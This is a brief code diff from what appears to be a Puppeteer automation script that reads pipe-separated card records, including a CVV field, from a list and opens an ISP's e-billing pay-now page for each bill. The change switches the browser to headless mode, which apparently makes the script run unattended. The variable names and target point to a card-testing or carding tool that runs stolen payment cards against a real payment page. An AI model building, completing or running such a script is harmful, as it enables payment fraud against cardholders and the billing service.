@@ -18,7 +18,7 @@ var no = 1;
         var cardcvv = list[i].split('|')[3]; //826
 
         const $options = { waitUntil: 'networkidle2' };
-        const browser = await puppeteer.launch({ headless: false });
+        const browser = await puppeteer.launch({ headless: true });
         const page = await browser.newPage();
 
         await page.goto('https://www.indihome.co.id/ebilling-paynow?billnum='+bill+'', $options);
